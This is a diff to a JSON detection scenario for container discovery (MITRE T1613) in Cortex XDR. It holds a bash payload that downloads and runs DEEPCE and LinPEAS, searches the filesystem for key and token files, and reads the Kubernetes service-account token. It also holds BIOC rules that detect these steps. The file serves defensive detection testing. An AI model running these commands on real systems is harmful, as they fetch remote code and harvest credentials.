@@ -49,7 +49,7 @@
   },
   "identity": {
     "name": "Container Enumeration via DEEPCE and LinPEAS (T1613)",
-    "summary": "A compromised container account runs container-aware enumeration tooling (DEEPCE, LinPEAS) plus hand-rolled discovery \u2014 reading /proc/1/status capability masks, listing /dev for block devices, inspecting overlay/docker mounts, and harvesting the mounted Kubernetes service-account token. Cortex Cloud runtime defense and XDR container BIOCs flag the known-tool signatures and the device/capability\u2026",
+    "summary": "A compromised container account runs container-aware enumeration tooling (DEEPCE, LinPEAS) plus hand-rolled discovery — reading /proc/1/status capability masks, listing /dev for block devices, inspecting overlay/docker mounts, and harvesting the mounted Kubernetes service-account token. Cortex Cloud runtime defense and XDR container BIOCs flag the known-tool signatures and the device/capability…",
     "description": "Container-aware enumeration is the first move TeamTNT performed after dropping the Hildegard toolkit into exposed Kubernetes workloads: before escalating they fingerprint the runtime to learn whether the container is privileged, what capabilities are granted, which host paths are mounted, and whether a service-account token is readable. This scenario reproduces that recon from a non-root container-runtime identity using the public DEEPCE container-enumeration script, LinPEAS, and direct reads of /proc/1/status, /dev, the overlay mount table, and /var/run/secrets/kubernetes.io/serviceaccount/token. The detection approach is container-context behavioral analysis: Cortex matches the verbatim DEEPCE/LinPEAS invocation signatures, the curl-pipe-bash download pattern inside a container, the capability-mask read coupled with device enumeration, the broad find-for-token filesystem sweep, and the service-account token access. A correlation rule fuses these recon stages from one container_id into a single Discovery incident, demonstrating XSIAM stitching across container runtime telemetry.",
     "severity": "high",
     "confidence": "high"
@@ -130,7 +130,7 @@
   "execution": {
     "target_platform": "linux",
     "execution_framework": "atomic-red-team",
-    "framework_reference_id": "T1613 \u2014 Container discovery via DEEPCE / LinPEAS enumeration scripts inside a running container.",
+    "framework_reference_id": "T1613 — Container discovery via DEEPCE / LinPEAS enumeration scripts inside a running container.",
     "privilege_required": "user",
     "prerequisites": [
       {
@@ -138,12 +138,12 @@
         "check_command": "systemctl is-active cortex-agent || ps aux | grep -i defender"
       },
       {
-        "description": "Lab environment matching scenario SIM-CDR-001 \u2014 a running container with curl/wget available and a mounted Kubernetes service-account token."
+        "description": "Lab environment matching scenario SIM-CDR-001 — a running container with curl/wget available and a mounted Kubernetes service-account token."
       }
     ],
     "payload": {
       "interpreter": "bash",
-      "code": "# Container-aware enumeration \u2014 read-only recon, no destructive actions.\ncurl -sSL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /tmp/deepce.sh && chmod +x /tmp/deepce.sh && bash /tmp/deepce.sh -nc 2>&1 | tee /tmp/deepce_output.txt\nls -la /dev/ | head -30 && cat /proc/1/status | grep -E 'CapEff|CapPrm' && mount | grep -E 'overlay|docker|k8s'\nfind / -name 'token' -o -name '*.pem' -o -name '*.key' 2>/dev/null | grep -v proc | head -20\ncat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-50\ncurl -sSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && timeout 60 bash /tmp/linpeas.sh -q 2>&1 | grep -E 'CVE|docker|container|cgroup|escape'",
+      "code": "# Container-aware enumeration — read-only recon, no destructive actions.\ncurl -sSL https://github.com/stealthcopter/deepce/raw/main/deepce.sh -o /tmp/deepce.sh && chmod +x /tmp/deepce.sh && bash /tmp/deepce.sh -nc 2>&1 | tee /tmp/deepce_output.txt\nls -la /dev/ | head -30 && cat /proc/1/status | grep -E 'CapEff|CapPrm' && mount | grep -E 'overlay|docker|k8s'\nfind / -name 'token' -o -name '*.pem' -o -name '*.key' 2>/dev/null | grep -v proc | head -20\ncat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | cut -c1-50\ncurl -sSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && timeout 60 bash /tmp/linpeas.sh -q 2>&1 | grep -E 'CVE|docker|container|cgroup|escape'",
       "input_variables": [],
       "timeout_seconds": 180
     },
@@ -179,7 +179,7 @@
       {
         "ioc_type": "filename",
         "value": "deepce.sh",
-        "context": "DEEPCE container-enumeration script \u2014 staged in /tmp and executed inside the container.",
+        "context": "DEEPCE container-enumeration script — staged in /tmp and executed inside the container.",
         "reputation_required": "any"
       },
       {
@@ -192,7 +192,7 @@
     "biocs": [
       {
         "name": "CDR-001 Package Manager Execution Inside Running Container",
-        "description": "Package manager execution inside running container \u2014 unusual install pattern indicates post-exploitation activity. apt-get/apk/yum runs interactively in a container where image content should already be baked.",
+        "description": "Package manager execution inside running container — unusual install pattern indicates post-exploitation activity. apt-get/apk/yum runs interactively in a container where image content should already be baked.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter actor_process_image_name in (\"apt-get\", \"apt\", \"apk\", \"yum\", \"dnf\")\n| filter action_process_image_command_line contains_any (\"install\", \"add\", \"update\")",
         "severity": "medium",
         "mitre_technique_ids": [
@@ -201,7 +201,7 @@
       },
       {
         "name": "CDR-001 DEEPCE Container Enumeration Script Execution",
-        "description": "DEEPCE container enumeration script execution \u2014 known tool signature matched by CDR BIOC rule. bash runs deepce.sh inside a container to fingerprint the runtime for escape vectors.",
+        "description": "DEEPCE container enumeration script execution — known tool signature matched by CDR BIOC rule. bash runs deepce.sh inside a container to fingerprint the runtime for escape vectors.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter actor_process_image_name in (\"bash\", \"sh\")\n| filter causality_actor_process_image_name in (\"bash\", \"sh\", \"runc\", \"containerd-shim\")\n| filter action_process_image_command_line contains \"deepce\"\n| fields _time, container_id, causality_actor_process_image_name, causality_actor_process_instance_id, actor_effective_username, action_process_image_command_line",
         "severity": "high",
         "mitre_technique_ids": [
@@ -219,7 +219,7 @@
       },
       {
         "name": "CDR-001 Container Capability Mask Read From Proc1 Status",
-        "description": "Container privileged mode enumeration \u2014 /proc/1/status capability read indicating escape preparation. A container process reads the init process capability mask to determine whether it runs privileged.",
+        "description": "Container privileged mode enumeration — /proc/1/status capability read indicating escape preparation. A container process reads the init process capability mask to determine whether it runs privileged.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.FILE\n| filter container_id != null\n| filter action_file_path in (\"/proc/1/status\", \"/proc/self/status\")\n| filter actor_process_image_name in (\"cat\", \"grep\", \"bash\", \"sh\", \"deepce.sh\")",
         "severity": "high",
         "mitre_technique_ids": [
@@ -237,7 +237,7 @@
       },
       {
         "name": "CDR-001 Service Account Token Access From Container",
-        "description": "Service account token access from within container \u2014 credential harvesting behavior. A container process reads the projected Kubernetes service-account token from the secrets mount.",
+        "description": "Service account token access from within container — credential harvesting behavior. A container process reads the projected Kubernetes service-account token from the secrets mount.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.FILE\n| filter container_id != null\n| filter action_file_path contains \"serviceaccount/token\"\n| filter actor_process_image_name in (\"cat\", \"find\", \"bash\", \"sh\", \"cp\")\n| filter causality_actor_process_image_name in (\"bash\", \"sh\", \"runc\", \"containerd-shim\")\n| fields _time, container_id, causality_actor_process_image_name, causality_actor_process_instance_id, actor_effective_username, action_file_path",
         "severity": "high",
         "mitre_technique_ids": [
@@ -255,7 +255,7 @@
       },
       {
         "name": "CDR-001 LinPEAS Privilege Escalation Tool In Container",
-        "description": "LinPEAS execution in container \u2014 post-exploitation privilege escalation tool signature. bash runs linpeas.sh inside a container to enumerate privilege-escalation and escape vectors.",
+        "description": "LinPEAS execution in container — post-exploitation privilege escalation tool signature. bash runs linpeas.sh inside a container to enumerate privilege-escalation and escape vectors.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter actor_process_image_name in (\"bash\", \"sh\", \"linpeas.sh\")\n| filter action_process_image_command_line contains \"linpeas\"",
         "severity": "high",
         "mitre_technique_ids": [
@@ -264,7 +264,7 @@
       },
       {
         "name": "CDR-001 Automated Discovery Command Burst In Container",
-        "description": "Multiple system enumeration commands executed in sequence \u2014 automated discovery behavior. A burst of distinct discovery binaries fires from one container lineage in a short window.",
+        "description": "Multiple system enumeration commands executed in sequence — automated discovery behavior. A burst of distinct discovery binaries fires from one container lineage in a short window.",
         "logic": "preset = xdr_data\n| filter event_type = ENUM.PROCESS\n| filter event_sub_type = ENUM.PROCESS_START\n| filter container_id != null\n| filter actor_process_image_name in (\"uname\", \"id\", \"hostname\", \"ls\", \"cat\", \"mount\", \"env\", \"find\")\n| comp count_distinct(actor_process_image_name) as discovery_breadth by container_id, causality_actor_process_instance_id\n| filter discovery_breadth >= 4",
         "severity": "medium",
         "mitre_technique_ids": [
@@ -297,14 +297,14 @@
     ],
     "correlation_rules": [
       {
-        "name": "Container Discovery Recon Chain \u2014 Same Container",
+        "name": "Container Discovery Recon Chain — Same Container",
         "rule_id": "CR-CDR-0001",
         "logic": "BIOC(CDR-001 DEEPCE Container Enumeration Script Execution) OR BIOC(CDR-001 Curl Pipe Bash Download Execute In Container) OR BIOC(CDR-001 Container Capability Mask Read From Proc1 Status) OR BIOC(CDR-001 Container Device Enumeration With Capability Inspection) OR BIOC(CDR-001 Service Account Token Access From Container) OR BIOC(CDR-001 Broad Filesystem Credential Search In Container) OR BIOC(CDR-001 LinPEAS Privilege Escalation Tool In Container) OR BIOC(CDR-001 Automated Discovery Command Burst In Container)"
       }
     ],
     "analytics_modules": [
-      "Cortex Cloud Runtime Defense \u2014 Container reconnaissance / enumeration tooling",
-      "Cortex XDR Analytics \u2014 Container process performing host capability and credential discovery"
+      "Cortex Cloud Runtime Defense — Container reconnaissance / enumeration tooling",
+      "Cortex XDR Analytics — Container process performing host capability and credential discovery"
     ]
   },
   "panw_mapping": {
@@ -343,14 +343,14 @@
         "evidence_query": "Correlation CR-CDR-0001 fuses DEEPCE/LinPEAS, capability/device recon, and service-account token access from one container into a single Discovery incident."
       }
     ],
-    "use_cases": [
+    "threat_scenarios": [
       {
-        "use_case_id": "UC-CLOUD-022",
-        "name": "Container Runtime Threat Detection \u2014 Enumeration Stage",
+        "threat_scenario_id": "TS-CLOUD-022",
+        "name": "Container Runtime Threat Detection — Enumeration Stage",
         "description": "Detect container-aware reconnaissance (DEEPCE/LinPEAS, capability + device inspection, service-account token harvest) and stitch the recon stages into one incident.",
-        "test_cases": [
+        "threat_steps": [
           {
-            "test_case_id": "TC-CLOUD-022A",
+            "threat_step_id": "TS-CLOUD-022A",
             "objective": "Each enumeration stage fires its corresponding Cortex container BIOC.",
             "preconditions": [
               "Cortex Cloud runtime defender or Cortex XDR Linux agent >= 8.4.0 reporting on the node.",
@@ -368,7 +368,7 @@
             "expected_score_weight": 0.6
           },
           {
-            "test_case_id": "TC-CLOUD-022B",
+            "threat_step_id": "TS-CLOUD-022B",
             "objective": "Recon stages stitch into a single container-discovery incident.",
             "success_criteria": [
               "Correlation `CR-CDR-0001` groups the recon stages from one container_id into one incident.",
@@ -403,7 +403,7 @@
       "primary": true
     },
     {
-      "title": "MITRE ATT&CK T1613 \u2014 Container and Resource Discovery",
+      "title": "MITRE ATT&CK T1613 — Container and Resource Discovery",
       "url": "https://attack.mitre.org/techniques/T1613/",
       "publisher": "MITRE",
       "publisher_id": "SRC-MITRE-ATTACK"
